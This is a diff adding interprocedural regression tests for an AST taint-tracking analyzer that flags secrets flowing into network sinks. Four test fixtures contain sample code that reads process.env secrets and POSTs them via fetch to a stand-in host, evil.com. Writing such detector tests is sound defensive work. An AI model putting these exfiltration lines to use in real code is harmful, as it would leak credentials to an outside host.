@@ -80,4 +80,38 @@ describe("AST Intra-Procedural Taint Tracking", () => {
 		const code = `const o = {}; o.x = "hello"; fetch("http://api.example.com", { method:"POST", body: o.x });`;
 		expect(analyzeTaint([{ path: "b.js", content: code }]).flows.length).toBe(0);
 	});
+
+	// ── interprocedural (function-summary) regressions ──
+	test("Interprocedural: return-taint helper (fetch(getSecret()))", () => {
+		const code = `function gs(){ return process.env.API_KEY; } fetch("http://evil.com", { method:"POST", body: gs() });`;
+		expect(analyzeTaint([{ path: "ip1.js", content: code }]).flows.length).toBeGreaterThan(0);
+	});
+	test("Interprocedural: param-to-sink (send(secret))", () => {
+		const code = `function send(x){ fetch("http://evil.com", { method:"POST", body:x }); } send(process.env.SECRET);`;
+		expect(analyzeTaint([{ path: "ip2.js", content: code }]).flows.length).toBeGreaterThan(0);
+	});
+	test("Interprocedural: param pass-through (fetch(ident(secret)))", () => {
+		const code = `function ident(x){ return x; } fetch("http://evil.com", { method:"POST", body: ident(process.env.K) });`;
+		expect(analyzeTaint([{ path: "ip3.js", content: code }]).flows.length).toBeGreaterThan(0);
+	});
+	test("Interprocedural: param-to-sink across 2 hops", () => {
+		const code = `function inner(x){ fetch("http://evil.com",{method:"POST",body:x}); } function outer(y){ inner(y); } outer(process.env.SECRET);`;
+		expect(analyzeTaint([{ path: "ip4.js", content: code }]).flows.length).toBeGreaterThan(0);
+	});
+	test("Interprocedural: helper returning a literal is NOT flagged", () => {
+		const code = `function gs(){ return "hello"; } fetch("http://api.example.com", { method:"POST", body: gs() });`;
+		expect(analyzeTaint([{ path: "ip5.js", content: code }]).flows.length).toBe(0);
+	});
+	test("Interprocedural: secret to a non-sink function is NOT flagged", () => {
+		const code = `function send(x){ console.log(x); } send(process.env.SECRET);`;
+		expect(analyzeTaint([{ path: "ip6.js", content: code }]).flows.length).toBe(0);
+	});
+	test("Interprocedural: an unknown/external function is not assumed a sink", () => {
+		const code = `unknownExternalSink(process.env.SECRET);`;
+		expect(analyzeTaint([{ path: "ip7.js", content: code }]).flows.length).toBe(0);
+	});
+	test("Recursion terminates (no hang)", () => {
+		const code = `function rec(x){ if (x) return rec(x); return process.env.K; } rec(1);`;
+		expect(() => analyzeTaint([{ path: "ip8.js", content: code }])).not.toThrow();
+	});
 });
